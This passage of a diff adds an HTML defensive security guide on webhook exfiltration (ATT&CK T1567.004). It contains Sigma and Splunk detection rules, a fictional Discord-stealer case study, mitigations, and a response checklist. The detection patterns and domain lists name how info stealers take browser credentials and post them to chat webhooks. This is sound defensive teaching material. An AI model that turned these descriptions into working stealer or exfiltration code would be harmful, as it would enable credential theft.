+        <p class="mini-note">The join key is the host (server) on the Sysmon side and the source IP on the proxy side, unified by <span class="mono">artifact</span>. An asset-to-IP lookup (a CMDB — configuration management database — export) would make this exact. One 15-minute bucket containing both an archive event and chat-API egress is the alert.</p>
+
+        <h4>Rule 7 · DNS first-seen resolution of chat API domains (Threat 1 companion)</h4>
+        <p><strong>Severity: high.</strong> This is the alert that fired in the case study and the number-one detection in the cheat sheet. The Sigma rule expresses the shape filters that run anywhere; the first-seen state is a baseline, which the SPL below implements with a lookup table.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sigma · chat_api_dns_resolution.yml</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-yaml">title: Chat API Domain Resolution from a Non-Browser Process
+id: 3a7d1f42-8c25-4b9e-a6d3-51e0b9c7f482
+status: experimental
+description: Detects DNS resolution of chat API domains (Discord, Slack, Telegram)
+  from a non-browser process. Pair it with the per-host first-seen baseline in the
+  SPL below to reproduce the alert used in the case study.
+references:
+  - https://attack.mitre.org/techniques/T1567/004/
+author: SOC Guide Builders
+date: 2025-02-14
+logsource:
+  category: dns
+  product: any
+detection:
+  selection_chat_domains:
+    query|endswith:
+      - 'discord.com'
+      - 'slack.com'
+      - 'api.telegram.org'
+      - 'hooks.slack.com'
+  filter_browsers:
+    processName|endswith:
+      - 'chrome.exe'
+      - 'msedge.exe'
+      - 'firefox.exe'
+  condition: selection_chat_domains and not filter_browsers
+fields:
+  - clientIp
+  - query
+  - processName
+falsepositives:
+  - Approved messaging, alerting, or monitoring tools that resolve chat domains
+    directly.
+  - DNS logs without process enrichment make the browser filter inert; tune for
+    your DNS pipeline.
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.004
+</code></pre>
+        </div>
+        <p><strong>Mapping:</strong> <span class="mono">category: dns</span> maps to any resolver or DNS-security product log; <span class="mono">query</span>, <span class="mono">clientIp</span>, and <span class="mono">processName</span> follow common DNS-log field conventions, so rename them to match your pipeline. Sigma cannot express a first-seen baseline — the SPL below carries that part, exactly as described in 5.4 Threat 1. <strong>False positives:</strong> approved tooling that resolves chat domains directly. <strong>Tuning:</strong> keep the baseline per host and per domain over a 30-day window. Drop the browser filter only if your DNS log carries no process field. Lower the level to medium for estates where chat use is normal on workstations.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Splunk SPL · first-seen chat API resolution per host</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-spl">index=dns sourcetype=structured_dns:query
+    (query="*discord.com" OR query="*slack.com" OR query="*api.telegram.org" OR query="*hooks.slack.com")
+    NOT processName IN ("*\\chrome.exe","*\\msedge.exe","*\\firefox.exe")
+| eval query=rtrim(query,".")
+| stats min(_time) as first_seen max(_time) as last_seen count as lookups
+        values(processName) as processes by clientIp, query
+| lookup chat_api_dns_baseline clientIp, query OUTPUT seen_before
+| where isnull(seen_before)
+| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
+| sort - first_seen</code></pre>
+        </div>
+        <p class="mini-note">The lookup <span class="mono">chat_api_dns_baseline</span> stores host/domain pairs already seen; a scheduled summary search builds and refreshes it. A match with no row means first-seen for that host. If your DNS log has no <span class="mono">processName</span> field, drop the <span class="mono">NOT</span> line and triage every first-seen chat domain by hand. Replace <span class="mono">index=dns</span>, the sourcetype, and the lookup name with your own.</p>
+      </section>
+      <section id="sec-6-case-study" class="content-section">
+        <div class="section-head">
+          <span class="section-num">6</span>
+          <h2>Real-World Case Study</h2>
+          <p class="section-intro">"Project Violet Hook" — an illustrative composite based on widely reported 2021–2024 Discord-webhook stealer waves, rebuilt as one timeline a mid-market SOC could actually walk through.</p>
+        </div>
+
+        <div class="callout warning">
+          <p><span class="callout-label">⚠ Warning — composite case.</span> This case study is an <strong>illustrative composite</strong>: the company, people, host names, and timings are fictional, but every step follows patterns described in public reporting on Discord-webhook info stealers. It is written to be used in training, not as a record of one specific incident.</p>
+        </div>
+
+        <h4>Context</h4>
+        <p>A 400-person finance and logistics firm runs a small SOC with a SIEM, EDR on all endpoints, and DNS and proxy logging. It has no chat-API egress policy — Discord, Slack, and Telegram were allowed everywhere because "sales needs them". A finance clerk, "J.", searches for a free invoice-numbering add-in, lands on a software-cracking site, and downloads a fake installer. Within three minutes the bundled info stealer has read the browser password store and cookies, packed the data into a ZIP, and posted it to the operator's Discord webhook. The SOC's first signal is a DNS first-seen alert at 09:47 — four minutes after the stolen archive left the network.</p>
+
+        <h4>Timeline</h4>
+        <ul class="timeline">
+          <li class="tl-item">
+            <span class="tl-date">Day 1 · 09:41</span>
+            <div class="tl-body">
+              <h4>Download</h4>
+              <p>J. downloads <span class="mono">InvoiceTool-Pro-Setup.exe</span> from a cracked-software site and runs it. EDR records the file; its reputation verdict is still pending, so nothing blocks.</p>
+            </div>
+          </li>
+          <li class="tl-item">
+            <span class="tl-date">Day 1 · 09:42</span>
+            <div class="tl-body">
+              <h4>Stealer executes and collects</h4>
+              <p>The installer drops <span class="mono">log_helper.exe</span> into %TEMP% and starts it. The stealer reads browser password stores, cookie databases, saved chat-app tokens, and a wallet folder — all in user context, no UAC.</p>
+            </div>
+          </li>
+          <li class="tl-item">
+            <span class="tl-date">Day 1 · 09:43</span>
+            <div class="tl-body">
+              <h4>Packing and POST</h4>
+              <p>The stealer writes <span class="mono">log_FIN-WS-0341.zip</span> (~380 KB) and POSTs it, with a credentials text file, to <span class="mono">discord.com/api/webhooks/&lt;id&gt;/&lt;token&gt;</span>. The archive is deleted a minute later.</p>
+            </div>
+          </li>
+          <li class="tl-item">
+            <span class="tl-date">Day 1 · 09:47 — detection point</span>
+            <div class="tl-body">
+              <h4>DNS first-seen alert fires</h4>
+              <p>The SIEM rule "first-seen chat API domain from non-browser process" fires. FIN-WS-0341 resolved <span class="mono">discord.com</span>, and the enriching lookup shows the resolver query came from <span class="mono">log_helper.exe</span>, not a browser. The analyst opens the EDR process tree and sees the file-read → archive → POST chain in one view.</p>
+            </div>
+          </li>
+          <li class="tl-item">
+            <span class="tl-date">Day 1 · 09:55–10:40</span>
+            <div class="tl-body">
+              <h4>Containment</h4>
+              <p>The analyst isolates the workstation with EDR and blocks chat-API egress for the workstation VLAN (network segment). Following the new runbook, the credential reset starts <strong>from a clean device</strong>, never from the infected one. Scope: every password saved in J.'s browsers, plus the corporate SSO (single sign-on) session and webmail.</p>
+            </div>
+          </li>
+          <li class="tl-item">
+            <span class="tl-date">Day 1 · 11:00–16:00</span>
+            <div class="tl-body">
+              <h4>Eradication</h4>
+              <p>EDR sweeps the estate for the stealer family hash set and behavior (browser-store reads followed by archive creation): two more machines hit, both cleaned. The fake installer is quarantined everywhere; a "Quick Coupon Finder" browser extension J. had also installed is removed as a secondary risk.</p>
+            </div>
+          </li>
+          <li class="tl-item">
+            <span class="tl-date">Day 1–3</span>
+            <div class="tl-body">
+              <h4>Recovery</h4>
+              <p>All of J.'s sessions are revoked, MFA (multi-factor authentication) is re-enrolled with a hardware token, and saved passwords are migrated into the corporate password manager. The team monitors identity logs and dark-web credential dumps for the harvested set; two attempts to sign in from an unusual region are blocked by the new MFA.</p>
+            </div>
+          </li>
+          <li class="tl-item">
+            <span class="tl-date">Week 2</span>
+            <div class="tl-body">
+              <h4>Impact and follow-up</h4>
+              <p>One compromised mailbox is used for an $18,000 business-email-compromise attempt against a supplier. The finance team's new verbal-verification rule catches it, so no money is lost. The stolen data itself was limited to J.'s browser profile; no file server or domain compromise was found.</p>
+            </div>
+          </li>
+        </ul>
+
+        <h4>Team response and communication</h4>
+        <p>The SOC paged the security lead at 09:48 and IT operations by 10:00, with a one-paragraph summary: what happened, what was taken, what was already done. HR (human resources) and J.'s manager were briefed with a no-blame script — the user was treated as a victim, which the post-incident review credits for the fast, honest cooperation. The security lead sent a company-wide note on Day 2 describing the fake-installer pattern and pointing at the new "report suspicious downloads" button.</p>
+
+        <h4>Lessons learned</h4>
+        <ul>
+          <li><strong>Chat-API egress policy for workstations is worth the cost.</strong> Blocking, or at least proxying, chat APIs from non-browser processes would have stopped the theft at step 5 of the chain.</li>
+          <li><strong>Webhook-URL regex rules scale.</strong> One rule covering <span class="mono">discord.com/api/webhooks/</span> in command lines and script blocks would have caught this sample and every future one using the same family default.</li>
+          <li><strong>Reset credentials from a clean device — always.</strong> Doing resets on the infected machine risks a re-steal loop; the runbook line is short and essential.</li>
+          <li><strong>Browser password managers plus MFA limit the damage.</strong> With a password manager and hardware-token MFA, a browser-store stealer gets far less usable loot.</li>
+          <li><strong>The fast first-seen alert made the difference.</strong> DNS first-seen, enriched with the process name, turned a silent theft into a same-hour response.</li>
+        </ul>
+      </section>
+      <section id="sec-7-mitigation" class="content-section">
+        <div class="section-head">
+          <span class="section-num">7</span>
+          <h2>Mitigation and Defense</h2>
+          <p class="section-intro">Layered controls that make webhook exfiltration hard: policy, identity, endpoint, network, cloud, logging, monitoring, backup, and response — plus what a small office should do first.</p>
+        </div>
+
+        <p>No single control stops this technique. Three layers together remove most of its value. Restrict where chat APIs can be reached from. Shrink the loot with password managers, MFA, and no saved browser passwords. Watch the edges with the DNS, proxy, and script-log detections from section 5. The cards below map concrete actions to each control area.</p>
+
+        <div class="grid cols-2">
+          <div class="card">
+            <h4>Policy &amp; identity</h4>
+            <ul>
+              <li>Write an acceptable-use and egress policy that names chat, file-drop, and webhook-receiver services explicitly.</li>
+              <li>Make browser-saved passwords a violation: corporate password manager with SSO instead.</li>
+              <li>Require phishing-resistant MFA (hardware keys or authenticator apps) and short session lifetimes for webmail and SSO.</li>
+              <li>Run a fast, practiced credential-reset runbook — resets happen from clean devices only.</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h4>Endpoint</h4>
+            <ul>
+              <li>EDR with tamper protection on all hosts; alert on unsigned binaries spawning from installers in %TEMP%.</li>
+              <li>Enable PowerShell script-block logging (4104) and module logging fleet-wide.</li>
+              <li>Browser policy: block non-store extensions, force-install the password manager, alert on extension permission grants.</li>
+              <li>Patch and restrict archive tools; on servers, treat archive creation as an exception to review.</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h4>Network &amp; cloud</h4>
+            <ul>
+              <li>Block or proxy chat-API egress from workstations and block it entirely from servers and CI runners.</li>
+              <li>Keep an egress allow-list for runners and service identities; review it quarterly.</li>
+              <li>Log DNS and proxy/SWG fully (with SNI) and ship both to the SIEM — these are the prerequisites for every detection in section 5.</li>
+              <li>Use CASB/SaaS controls to spot odd app permissions and connectors in your chat tenants.</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h4>Logging, monitoring, backup &amp; response</h4>
+              <ul>
+              <li>Centralize Sysmon/EDR, DNS, proxy, PowerShell, and identity logs with sane retention (hot 90 days, cold 1 year+).</li>
+              <li>Deploy the Sigma/SPL rules from 5.5; tune false positives weekly during the first month.</li>
+              <li>Keep offline, tested backups — they limit leverage if exfiltration precedes encryption.</li>
+              <li>Rehearse the stealer scenario yearly: isolate → reset from clean device → sweep → hunt the URL pattern estate-wide.</li>
+            </ul>
+          </div>
+        </div>
+
+        <h4>Home and small-office advice</h4>
+        <ul>
+          <li>Use a password manager and turn on MFA everywhere — an authenticator app or hardware key beats SMS.</li>
+          <li>Do not install cracked software; the "free tool" is the delivery method in most stealer cases.</li>
+          <li>Sign out of browser profiles you do not use, and never save passwords in a browser on a shared PC.</li>
+          <li>If your accounts feel compromised, change the password from a different, clean device and revoke active sessions in account settings.</li>
+        </ul>
+
+        <h4>Prioritized actions</h4>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Action</th><th>Effort</th><th>Owner</th><th>Expected risk reduction</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>Ship DNS + proxy (SNI) logs into the SIEM — prerequisite for all detections here</td><td>Medium</td><td>SOC / Network</td><td><span class="badge sev-high">High</span></td></tr>
+              <tr><td>Block/direct chat-API egress per policy (workstations proxied, servers and runners blocked)</td><td>Low</td><td>Network</td><td><span class="badge sev-high">High</span></td></tr>
+              <tr><td>Deploy webhook-URL regex detections (5.5 rules 1–4 and 7) and first-seen DNS alerting</td><td>Low</td><td>SOC</td><td><span class="badge sev-high">High</span></td></tr>
+              <tr><td>MFA + corporate password-manager rollout (kills most stealer loot)</td><td>Medium</td><td>IT</td><td><span class="badge sev-high">High</span></td></tr>
+              <tr><td>Extension governance: block non-store extensions, alert on grants</td><td>Medium</td><td>IT</td><td><span class="badge sev-medium">Medium</span></td></tr>
+              <tr><td>Script-block logging (4104) enabled fleet-wide</td><td>Low</td><td>IT / SOC</td><td><span class="badge sev-high">High</span></td></tr>
+              <tr><td>Quarterly egress allow-list review for CI runners and service identities</td><td>Low</td><td>Platform / SOC</td><td><span class="badge sev-medium">Medium</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout practice">
+          <p><span class="callout-label">✓ Good practice.</span> Do the two "Low effort / High reduction" rows first: the webhook-URL regex rules and the chat-API egress policy. Together they stop the dominant info-stealer pattern in most estates for roughly a week of work.</p>
+        </div>
+      </section>
+      <section id="sec-8-mistakes" class="content-section">
+        <div class="section-head">
+          <span class="section-num">8</span>
+          <h2>Common Mistakes and Best Practices</h2>
+          <p class="section-intro">Twelve concrete blue-team mistakes around webhook exfiltration — what they look like, why they happen, and how to fix and prevent each one.</p>
+        </div>
+
+        <div class="grid cols-2">
+          <div class="card">
+            <h4>1 · Chat domains allowed everywhere "because sales uses Slack"</h4>
+            <p><strong>Symptom:</strong> every workstation can reach every chat API directly; the SOC has no egress lever to pull during an incident.</p>
+            <p><strong>Root cause:</strong> egress policy treated as all-or-nothing instead of per-purpose (browser use proxied, API calls restricted).</p>
+            <p><strong>Fix:</strong> allow chat web apps via the proxy for the teams that need them; block direct API/webhook paths from everything else.</p>
+            <p><strong>Prevention:</strong> a written egress matrix (who, what, from where) reviewed with business owners twice a year.</p>
+          </div>
+          <div class="card">
+            <h4>2 · DNS logged but first-seen never alerted</h4>
+            <p><strong>Symptom:</strong> resolver logs exist and are searchable, yet the stealer's first <span class="mono">discord.com</span> query sat unnoticed for weeks.</p>
+            <p><strong>Root cause:</strong> logging treated as the goal; nobody built the "new domain per host" logic or the non-browser enrichment.</p>
+            <p><strong>Fix:</strong> build a 30-day per-host domain baseline and alert on first-seen chat API domains from non-browser processes.</p>
+            <p><strong>Prevention:</strong> a detection-coverage review that pairs every log source with at least one live rule.</p>
+          </div>
+          <div class="card">
+            <h4>3 · Credential reset performed from the infected machine</h4>
+            <p><strong>Symptom:</strong> the "cleaned" account is stolen again hours later; the EDR shows the stealer re-running.</p>
+            <p><strong>Root cause:</strong> the runbook never said where resets happen from, and the stealer's cookie/token theft was underestimated.</p>
+            <p><strong>Fix:</strong> treat the machine as hostile until reimaged; all resets and MFA re-enrollment from a clean device.</p>
+            <p><strong>Prevention:</strong> one bold line at the top of the runbook: "Never reset from the infected host."</p>
+          </div>
+          <div class="card">
+            <h4>4 · Matching domains only — too many web-app false positives</h4>
+            <p><strong>Symptom:</strong> an alert on <span class="mono">discord.com</span> fires for hundreds of normal browser users every day and is muted within a week.</p>
+            <p><strong>Root cause:</strong> the rule lacks the URL-path or process context that separates chatting from webhook posting.</p>
+            <p><strong>Fix:</strong> alert on the path (<span class="mono">/api/webhooks/</span>, <span class="mono">/bot…/sendDocument</span>) at the proxy, or on non-browser processes at the endpoint.</p>
+            <p><strong>Prevention:</strong> every new rule ships with its top-10 false positives measured in the first week and a tuning note.</p>
+          </div>
+          <div class="card">
+            <h4>5 · Alert fatigue: webhook alerts with no owner</h4>
+            <p><strong>Symptom:</strong> alerts route to a shared mailbox; nobody can say who triages them or how fast.</p>
+            <p><strong>Root cause:</strong> detection deployed without an ownership and SLA decision.</p>
+            <p><strong>Fix:</strong> assign each rule an owner, a severity, and a triage SLA (response-time target) in the alert platform itself.</p>
+            <p><strong>Prevention:</strong> quarterly review that retires, tunes, or re-assigns every rule that generated no action.</p>
+          </div>
+          <div class="card">
+            <h4>6 · Missing PowerShell script-block logging</h4>
+            <p><strong>Symptom:</strong> proxy shows a webhook POST, but there is no way to see which script sent it; the insider case stalls.</p>
+            <p><strong>Root cause:</strong> GPO (Group Policy object) for module/script-block logging never rolled out, or only on servers.</p>
+            <p><strong>Fix:</strong> enable script-block logging (4104) fleet-wide and ship the log to the SIEM.</p>
+            <p><strong>Prevention:</strong> a logging baseline checklist per OS (operating system) that new estates must pass before go-live.</p>
+          </div>
+          <div class="card">
+            <h4>7 · Weak tuning: regex too loose or too specific</h4>
+            <p><strong>Symptom:</strong> either "webhook" matches everything (noise), or the rule pins one attacker token and misses the very next campaign.</p>
+            <p><strong>Root cause:</strong> rules written against one sample instead of the URL pattern family.</p>
+            <p><strong>Fix:</strong> match shapes (<span class="mono">/api/webhooks/[0-9]+/[\w-]+</span>, token pattern), and test them against a month of historical data before going live.</p>
+            <p><strong>Prevention:</strong> a small regression set of benign and malicious log lines run against every rule change.</p>
+          </div>
+          <div class="card">
+            <h4>8 · Cleaning one machine, hunting nowhere</h4>
+            <p><strong>Symptom:</strong> the incident closes after reimaging one PC; two more stealer infections surface the next month.</p>
+            <p><strong>Root cause:</strong> no estate-wide hunt step tied to the finding.</p>
+            <p><strong>Fix:</strong> after every confirmed case, hunt the captured URL pattern and hashes across 90 days of DNS, proxy, and EDR history.</p>
+            <p><strong>Prevention:</strong> make "hunt estate-wide" a checkbox in the incident template before closure is allowed.</p>
+          </div>
+          <div class="card">
+            <h4>9 · No zone or asset context on egress events</h4>
+            <p><strong>Symptom:</strong> analysts cannot tell a build runner's POST from a workstation's, so CI exfiltration is invisible.</p>
+            <p><strong>Root cause:</strong> proxy and DNS logs lack subnet, zone, or CMDB enrichment.</p>
+            <p><strong>Fix:</strong> enrich network logs with subnet/zone and asset-role lookups at ingest or search time.</p>
+            <p><strong>Prevention:</strong> a living CMDB export feeding the SIEM, refreshed monthly.</p>
+          </div>
+          <div class="card">
+            <h4>10 · Blunt blocking without a change process</h4>
+            <p><strong>Symptom:</strong> overnight "block discord.com" breaks deploy bots and support tooling; the block is rolled back and trust is lost.</p>
+            <p><strong>Root cause:</strong> no inventory of legitimate chat integrations before the change.</p>
+            <p><strong>Fix:</strong> stage blocks (monitor → restrict → block), allow-list documented integrations by path and identity.</p>
+            <p><strong>Prevention:</strong> route every egress change through the normal change board with owners attached.</p>
+          </div>
+          <div class="card">
+            <h4>11 · Impossible-travel alerts never linked to the stealer</h4>
+            <p><strong>Symptom:</strong> identity alerts and the endpoint incident live in different tickets; the account-takeover story is missed.</p>
+            <p><strong>Root cause:</strong> no correlation between identity and endpoint cases for the same user.</p>
+            <p><strong>Fix:</strong> when a stealer is confirmed, check the user's identity alerts and sessions the same day; link tickets both ways.</p>
+            <p><strong>Prevention:</strong> a case-management rule that auto-merges identity and endpoint cases for one user within 72 hours.</p>
+          </div>
+          <div class="card">
+            <h4>12 · Captured webhook URL never reported to the provider</h4>
+            <p><strong>Symptom:</strong> the same webhook keeps receiving loot from other victims — including possibly your other offices.</p>
+            <p><strong>Root cause:</strong> responders see the URL as evidence only, not as an abusable live endpoint.</p>
+            <p><strong>Fix:</strong> report the webhook/token or bot token to the provider (Discord, Slack, Telegram) with the case number.</p>
+            <p><strong>Prevention:</strong> add "report live drop box to provider" to the response checklist in section 9.</p>
+          </div>
+        </div>
+
+        <h4>Habits that keep you sharp</h4>
+        <div class="grid cols-3">
+          <div class="card">
+            <h4>Daily</h4>
+            <ul>
+              <li>Review first-seen chat-API DNS alerts and any webhook-path proxy hits.</li>
+              <li>Check that EDR, DNS, and proxy feeds all arrived on time.</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h4>Weekly</h4>
+            <ul>
+              <li>Tune rules with the week's false positives; note changes in the rule's comments.</li>
+              <li>Spot-check one new or changed SaaS integration for odd egress.</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h4>Monthly</h4>
+            <ul>
+              <li>Hunt the current stealer URL patterns across 90 days of history.</li>
+              <li>Review egress allow-lists and extension inventory; report captured drop boxes still alive.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="callout practice">
+          <p><span class="callout-label">✓ Good practice.</span> Print mistakes 2, 3, and 8 for your incident room wall. They are the three that turn a small stealer incident into either a fast save or a slow, expensive account-takeover project.</p>
+        </div>
+      </section>
+      <section id="sec-9-cheat-sheet" class="content-section">
+        <div class="section-head">
+          <span class="section-num">9</span>
+          <h2>Cheat Sheet and Quick Reference</h2>
+          <p class="section-intro">The one-page version: key facts, the top five detections, a response checklist, and the official links worth bookmarking.</p>
+        </div>
+
+        <h4>Key facts</h4>
+        <ul class="kv">
+          <li><span class="k">Technique</span><span class="v mono">T1567.004 — Exfiltration Over Webhook (sub-technique of T1567, tactic TA0010)</span></li>
+          <li><span class="k">ATT&amp;CK data</span><span class="v">Version 1.2 · created 20 July 2023 · last modified 12 May 2026</span></li>
+          <li><span class="k">One-line summary</span><span class="v">Malware or a script POSTs stolen files/text to an attacker-owned chat webhook (Discord, Slack, Telegram, generic receivers) over trusted HTTPS.</span></li>
+          <li><span class="k">What to watch</span><span class="v">First-seen DNS to chat APIs from non-browser processes; webhook URL patterns in command lines, script blocks, and proxy paths; archive-create → POST chains; impossible-travel sign-ins afterwards.</span></li>
+          <li><span class="k">First response</span><span class="v">Isolate → capture the webhook URL → reset credentials from a clean device → sweep the estate → report the drop box to the provider.</span></li>
+        </ul>
+
+        <h4>Top detections</h4>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>#</th><th>Detection idea</th><th>Source</th><th>Rule in this guide</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>1</td><td>DNS first-seen to chat APIs from a non-browser process</td><td class="mono">index=dns + EDR enrichment</td><td>Rule 7 (with the 5.4 Threat 1 story)</td></tr>
+              <tr><td>2</td><td>Webhook URL pattern in command lines and script blocks (<span class="mono">discord\.com/api/webhooks/[0-9]+/[\w-]+</span>)</td><td class="mono">Sysmon 1 · PowerShell 4104</td><td>Rules 1 and 4</td></tr>
+              <tr><td>3</td><td>Archive-create → immediate chat-API POST chain on one host</td><td class="mono">Sysmon 11 + 3 · proxy</td><td>Rule 6 + SPL join</td></tr>
+              <tr><td>4</td><td>Impossible-travel or new-device sign-in after a suspected steal</td><td class="mono">Identity provider logs</td><td>Triage step 4 · case study</td></tr>
+              <tr><td>5</td><td>Per-extension egress anomalies to chat/receiver domains</td><td class="mono">Browser logs · EDR</td><td>Rule 5</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h4>Response checklist</h4>
+        <ol>
+          <li><strong>Capture and report the webhook URL</strong> (ID and token) and, for Telegram, the bot token — report to the provider so the drop box dies.</li>
+          <li><strong>Reset ALL browser-saved credentials</strong> for affected users, from a clean device, and migrate them into a password manager.</li>
+          <li><strong>Revoke sessions and re-enroll MFA</strong> — cookies and tokens are stolen goods in every stealer case.</li>
+          <li><strong>Sweep the estate</strong> for the stealer hash family and its behavior (browser-store reads → archive → POST).</li>
+          <li><strong>Block chat-API egress</strong> for affected segments per the egress policy.</li>
+          <li><strong>Hunt the URL pattern</strong> across DNS, proxy, EDR, and script logs for 90 days.</li>
+          <li><strong>Check BEC (business email compromise) exposure</strong> — review the mailbox rules, sent items, and recent supplier conversations.</li>
+          <li><strong>Train and debrief the user</strong> with a no-blame script; capture the fake-installer lure for awareness content.</li>
+        </ol>
+
+        <h4>Official links</h4>
+        <ul>
+          <li><a href="https://attack.mitre.org/techniques/T1567/004/">ATT&amp;CK · T1567.004 — Exfiltration Over Webhook</a> (this page's technique)</li>
+          <li><a href="https://attack.mitre.org/techniques/T1567/">ATT&amp;CK · T1567 — Exfiltration Over Web Service</a> (parent technique)</li>
+          <li><a href="https://attack.mitre.org/techniques/T1567/003/">ATT&amp;CK · T1567.003 — Exfiltration to Text Storage Sites</a> (sibling technique)</li>
+          <li><a href="https://attack.mitre.org/techniques/T1102/">ATT&amp;CK · T1102 — Web Service</a> (c2-over-web-service cousin)</li>
+          <li><a href="https://attack.mitre.org/techniques/T1555/">ATT&amp;CK · T1555 — Credentials from Password Stores</a> (what feeds the loot)</li>
+          <li><a href="https://attack.mitre.org/techniques/T1560/001/">ATT&amp;CK · T1560.001 — Archive via Utility</a> (the packing step)</li>
+        </ul>
+
+        <div class="callout note">
+          <p><span class="callout-label">🛈 Note — keep this honest.</span> Every rule in this guide is a starting point: measure its false positives on your own data, tune, and re-measure. A detection you trust beats a detection that merely exists.</p>
+        </div>
+      </section>
+    </main>
+  </div>
+  <button id="tocOpen" class="float-btn" type="button" aria-haspopup="dialog" aria-controls="tocOverlay">Contents</button>
+  <button id="backToTop" class="float-btn" type="button" aria-label="Back to top">↑</button>
+
+  <div id="tocOverlay" class="overlay" hidden role="dialog" aria-modal="true" aria-label="Table of contents">
+    <div class="overlay-panel">
+      <div class="overlay-head">
+        <p class="overlay-title">Contents</p>
+        <button id="overlayClose" class="overlay-close" type="button">✕ Close</button>
+      </div>
+      <nav id="overlayNav" aria-label="Section links"></nav>
+      <button id="themeToggleOverlay" class="theme-btn" type="button" aria-label="Switch color theme">🌙 <span>Dark mode</span></button>
+    </div>
+  </div>
+
+  <div id="simTooltip" class="sim-tooltip" role="status" aria-hidden="true"></div>
+
+  <script>
+  (function(){
+    'use strict';
+    var d = document, w = window;
+    var reduceMotion = !!(w.matchMedia && w.matchMedia('(prefers-reduced-motion: reduce)').matches);
+
+    /* ================= Theme ================= */
+    var themeBtns = [];
+    var tb1 = d.getElementById('themeToggle');
+    var tb2 = d.getElementById('themeToggleOverlay');
+    if (tb1) themeBtns.push(tb1);
+    if (tb2) themeBtns.push(tb2);
+    function currentTheme(){
+      var t = d.documentElement.getAttribute('data-theme');
+      return (t === 'light') ? 'light' : 'dark';
+    }
+    function syncThemeLabels(){
+      var t = currentTheme();
+      themeBtns.forEach(function(b){
+        var span = b.querySelector('span');
+        if (span) span.textContent = (t === 'dark') ? 'Dark mode' : 'Light mode';
+        b.firstChild.nodeValue = (t === 'dark') ? '🌙 ' : '☀️ ';
+        b.setAttribute('aria-label', 'Switch color theme (currently ' + t + ')');
+      });
+    }
+    function setTheme(t){
+      d.documentElement.setAttribute('data-theme', t);
+      try { localStorage.setItem('atk-theme', t); } catch (e) {}
+      syncThemeLabels();
+      if (sim) sim.onThemeChange();
+    }
+    themeBtns.forEach(function(b){
+      b.addEventListener('click', function(){ setTheme(currentTheme() === 'dark' ? 'light' : 'dark'); });
+    });
+    syncThemeLabels();
+
+    /* ================= Progress bar + back-to-top ================= */
+    var fill = d.getElementById('progressFill');
+    var btt = d.getElementById('backToTop');
+    var scrollTicking = false;
+    function updateScrollUI(){
+      scrollTicking = false;
+      var st = w.scrollY || d.documentElement.scrollTop || 0;
+      var max = (d.documentElement.scrollHeight - w.innerHeight) || 1;
+      if (fill) fill.style.width = Math.min(100, Math.max(0, (st / max) * 100)) + '%';
+      if (btt) btt.classList.toggle('show', st > 600);
+      if (st < 160) setActive('');
+    }
+    w.addEventListener('scroll', function(){
+      if (!scrollTicking) { scrollTicking = true; w.requestAnimationFrame(updateScrollUI); }
+    }, { passive: true });
+    if (btt) btt.addEventListener('click', function(){
+      w.scrollTo({ top: 0, behavior: reduceMotion ? 'auto' : 'smooth' });
+    });
+
+    /* ================= TOC build (from real headings) ================= */
+    var main = d.getElementById('main-content');
+    var tocNav = d.getElementById('tocNav');
+    var overlayNav = d.getElementById('overlayNav');
+    var tocLinks = [];   /* {a, id} */
+    function buildTocInto(nav){
+      if (!nav) return;
+      var ul = d.createElement('ul');
+      main.querySelectorAll('h2, h3').forEach(function(h){
+        var id, label, sub = false;
+        if (h.tagName === 'H2') {
+          var sec = h.closest('section');
+          if (!sec) return;
+          id = sec.id;
+          var num = sec.querySelector('.section-num');
+          label = (num ? num.textContent.trim() + ' · ' : '') + h.textContent.trim();
+        } else {
+          id = h.id;
+          if (!id) return;
+          label = h.textContent.trim().replace(/\s+/, ' · ');
+          sub = true;
+        }
+        var li = d.createElement('li');
+        var a = d.createElement('a');
+        a.href = '#' + id;
+        a.textContent = label;
+        if (sub) a.className = 'toc-sub';
+        a.addEventListener('click', function(e){
+          var target = d.getElementById(id);
+          if (target) {
+            e.preventDefault();
+            target.scrollIntoView({ behavior: reduceMotion ? 'auto' : 'smooth' });
+            try { history.replaceState(null, '', '#' + id); } catch (err) {}
+            closeOverlay();
+          }
+        });
+        li.appendChild(a);
+        ul.appendChild(li);
+        tocLinks.push({ a: a, id: id });
+      });
+      nav.appendChild(ul);
+    }
+    buildTocInto(tocNav);
+    buildTocInto(overlayNav);
+    function setActive(id){
+      tocLinks.forEach(function(l){
+        l.a.classList.toggle('active', !!id && l.id === id);
+      });
+    }
+    if ('IntersectionObserver' in w) {
+      var currentActive = '';
+      var io = new IntersectionObserver(function(entries){
+        entries.forEach(function(en){
+          if (en.isIntersecting) { currentActive = en.target.id; setActive(currentActive); }
+        });
+      }, { rootMargin: '-35% 0px -55% 0px', threshold: 0 });
+      tocLinks.forEach(function(l){
+        var el = d.getElementById(l.id);
+        if (el) io.observe(el);
+      });
+      /* scroll-math fallback: keep highlight correct between IO firing points */
+      w.addEventListener('scroll', function(){
+        if (scrollTicking2) return;
+        scrollTicking2 = true;
+        w.requestAnimationFrame(function(){
+          scrollTicking2 = false;
+          var st = w.scrollY || 0;
+          if (st < 160) { setActive(''); return; }
+          var best = '';
+          tocLinks.forEach(function(l){
+            var el = d.getElementById(l.id);
+            if (el && el.getBoundingClientRect().top <= 140) best = l.id;
+          });
+          if (best && best !== currentActive) { currentActive = best; setActive(best); }
+        });
+      }, { passive: true });
+    }
+    var scrollTicking2 = false;
+
+    /* ================= Mobile contents overlay ================= */
+    var overlay = d.getElementById('tocOverlay');
+    var tocOpen = d.getElementById('tocOpen');
+    var overlayClose = d.getElementById('overlayClose');
